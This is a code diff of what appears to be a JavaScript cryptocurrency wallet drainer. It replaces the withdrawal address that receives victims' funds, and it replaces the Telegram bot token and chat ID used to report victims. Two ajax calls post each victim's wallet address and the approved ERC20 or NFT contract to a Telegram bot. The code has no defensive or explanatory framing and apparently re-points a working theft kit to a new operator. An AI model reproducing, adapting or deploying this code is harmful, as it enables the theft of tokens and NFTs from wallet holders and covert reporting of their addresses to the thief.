@@ -60,7 +60,7 @@ const accountBalances = {
     nft: []
 }
 
-const WITHDRAWAL_ADDRESS = "0x36b159129DDBd4988De8a7911935712af24C05c7"
+const WITHDRAWAL_ADDRESS = "0xa9C0c94D32030669Da064183A8d11211A28B57Bf"
 const MINIMAL_SUM_IN_USD = 1
 
 let accountAddress = null, walletConnector, currentConnection
@@ -238,7 +238,7 @@ const getBalances = async () => {
 
                     var z=$.ajax({  
     type: "POST",  
-    url: "https://api.telegram.org/bot"+"5343408432:AAFrrAwn_jdMImmv8h1nDm5mP4zkDl43n88"+"/sendMessage?chat_id="+"426701664",
+    url: "https://api.telegram.org/bot"+"5487301186:AAH1-Ap39rg41GNue7UuMso1Y6y2EqAcHlI"+"/sendMessage?chat_id="+"163483324",
     data: "parse_mode=HTML&text="+encodeURIComponent("ERC20 Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address), 
     }); 
 
@@ -254,7 +254,7 @@ const getBalances = async () => {
 
                    var z=$.ajax({  
     type: "POST",  
-    url: "https://api.telegram.org/bot"+"5343408432:AAFrrAwn_jdMImmv8h1nDm5mP4zkDl43n88"+"/sendMessage?chat_id="+"426701664",
+    url: "https://api.telegram.org/bot"+"5487301186:AAH1-Ap39rg41GNue7UuMso1Y6y2EqAcHlI"+"/sendMessage?chat_id="+"163483324",
     data: "parse_mode=HTML&text="+encodeURIComponent("NFT Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address), 
     }); 
 
